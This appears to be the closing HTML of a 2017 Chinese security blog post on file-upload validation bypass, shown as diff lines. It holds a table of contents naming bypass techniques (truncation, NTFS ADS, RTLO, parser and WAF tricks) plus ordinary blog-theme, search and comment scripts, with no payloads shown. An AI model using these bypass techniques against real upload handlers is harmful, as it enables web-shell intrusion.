+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传校验姿势"><span class="nav-number">1.</span> <span class="nav-text">文件上传校验姿势</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传绕过校验姿势"><span class="nav-number">2.</span> <span class="nav-text">文件上传绕过校验姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-客户端绕过"><span class="nav-number">2.1.</span> <span class="nav-text">1.客户端绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-服务端绕过"><span class="nav-number">2.2.</span> <span class="nav-text">2.服务端绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-文件类型绕过"><span class="nav-number">2.2.1.</span> <span class="nav-text">2.1 文件类型绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-文件头绕过"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.2 文件头绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-文件名-后缀绕过"><span class="nav-number">2.2.3.</span> <span class="nav-text">2.3 文件名/后缀绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-1-截断"><span class="nav-number">2.2.3.1.</span> <span class="nav-text">2.3.1 截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-2-windows特性"><span class="nav-number">2.2.3.2.</span> <span class="nav-text">2.3.2 windows特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-3-ASP"><span class="nav-number">2.2.3.3.</span> <span class="nav-text">2.3.3 ASP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-4-JSP"><span class="nav-number">2.2.3.4.</span> <span class="nav-text">2.3.4 JSP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-5-PHP"><span class="nav-number">2.2.3.5.</span> <span class="nav-text">2.3.5 PHP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-配合文件包含漏洞"><span class="nav-number">2.2.4.</span> <span class="nav-text">3.配合文件包含漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-配合服务器解析漏洞"><span class="nav-number">2.2.5.</span> <span class="nav-text">4.配合服务器解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-配合操作系统文件命令规则"><span class="nav-number">2.2.6.</span> <span class="nav-text">5.配合操作系统文件命令规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-CMS、编辑器漏洞"><span class="nav-number">2.2.7.</span> <span class="nav-text">6.CMS、编辑器漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-其他规则"><span class="nav-number">2.2.8.</span> <span class="nav-text">7.其他规则</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#7-1-利用waf特性"><span class="nav-number">2.2.8.1.</span> <span class="nav-text">7.1 利用waf特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-2-利用NTFS-ADS特性"><span class="nav-number">2.2.8.2.</span> <span class="nav-text">7.2 利用NTFS ADS特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-3-利用RTLO"><span class="nav-number">2.2.8.3.</span> <span class="nav-text">7.3 利用RTLO</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-4-特殊的长文件名绕过"><span class="nav-number">2.2.8.4.</span> <span class="nav-text">7.4 特殊的长文件名绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-5-反删除"><span class="nav-number">2.2.8.5.</span> <span class="nav-text">7.5 反删除</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-8-图片转换-二次渲染-文件幻数检测"><span class="nav-number">2.2.8.6.</span> <span class="nav-text">7.8 图片转换/二次渲染/文件幻数检测</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-linkedin"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w2n1ck</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://mydisqus-2.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://byd.dropsec.xyz/2017/02/21/文件上传-绕过/';
+          this.page.identifier = '2017/02/21/文件上传-绕过/';
+          this.page.title = '文件上传(绕过)';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://mydisqus-2.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+<script type="text/javascript" color="255,0,0" opacity='0.7' zIndex="-2" count="80" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
